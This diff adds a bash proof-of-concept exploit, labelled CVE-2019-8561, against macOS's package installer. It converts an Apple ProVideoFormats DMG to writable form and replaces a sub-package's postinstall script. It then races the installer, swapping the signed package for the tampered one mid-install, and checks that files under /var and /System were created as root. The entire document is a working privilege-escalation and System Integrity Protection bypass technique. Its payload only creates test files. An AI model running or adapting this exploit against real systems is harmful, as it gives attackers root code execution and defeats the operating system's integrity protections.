@@ -1,0 +1,89 @@
+#!/bin/bash
+# CVE-2019-8561/sip_poc
+
+dmg_path="/Users/0xmachos/Downloads/ProVideoFormats.dmg"
+pkg_path="/Volumes/ProVideoFormats 2.0.7/ProVideoFormats.pkg"
+expand_path="/tmp/PVF"
+touch_path="/var/test"
+
+
+echo "Waiting for ProVideoFormats DMG in ~/Downloads..."
+
+while true; do
+  
+  if ls "/Users/0xmachos/Downloads" | grep -q 'ProVideoFormats.dmg'; then
+
+    echo "Found ${dmg_path}"
+
+    echo "Converting read-only DMG to RW..."
+    hdiutil convert -ov "${dmg_path:?}" -format UDRW -o "${dmg_path:?}" >/dev/null
+    # This should take 2-3 seconds
+    break
+  fi
+  sleep 2
+  # Sleep so we don't run ls 6 times a second
+done
+
+echo "Resizing DMG"
+hdiutil resize -size 200m "${dmg_path:?}"
+
+echo "Waiting for ProVideoFormats.dmg to be mounted..."
+
+while true; do
+  if ls "/Volumes" | grep -q 'ProVideoFormats'; then
+    break
+  fi
+done
+    
+echo "Expanding PKG"
+if ! pkgutil --expand "${pkg_path:?}" "${expand_path:?}"; then
+  echo "Fucked it"
+  exit 1
+fi
+
+echo "Replacing MXFPlugIns.pkg/Scripts/postinstall"
+cat <<EOF > "${expand_path:?}/MXFPlugIns.pkg/Scripts/postinstall"
+#!/bin/bash
+
+touch /var/test
+touch /System/CERT
+EOF
+
+echo "Flattening PKG"
+pkgutil --flatten  "${expand_path:?}" "/tmp/ProVideoFormats.pkg"
+chown "${USER}":staff "/tmp/ProVideoFormats.pkg"
+# The new PKG gets created with $USER:wheel ownership which causes an error
+# When moving it to another volume 
+
+# echo "Starting install..."
+# installer -pkg "${pkg_path:?}" -target / &
+
+cp "${pkg_path:?}" "/Users/0xmachos/Desktop/"
+pkg_path="/Users/0xmachos/Desktop/ProVideoFormats.pkg"
+
+
+echo "Waiting for PKG installer to start..."
+( tail -f -n 0  /var/log/install.log & ) | grep -q 'Extracting file'
+
+echo "Removing ${pkg_path}"
+rm -f "${pkg_path:?}"
+
+echo "Replacing ProVideoFormats.pkg with malicious PKG"
+mv -f "/tmp/ProVideoFormats.pkg" "${pkg_path}"
+
+
+echo "Removing Expanded PKG"
+rm -rf "${expand_path:?}"
+
+echo "Wait for it..."
+( tail -f -n0  /var/log/install.log & ) | grep -q 'End install' 
+
+test_owner=$(ls -l "${touch_path}" | awk '{print $3}')
+
+if [[ -f "${touch_path}" && "${test_owner}" == "root" ]]; then
+  echo "Exploit successful!"
+  exit 0
+else
+  echo "Exploit unsuccessful"
+  exit 1
+fi
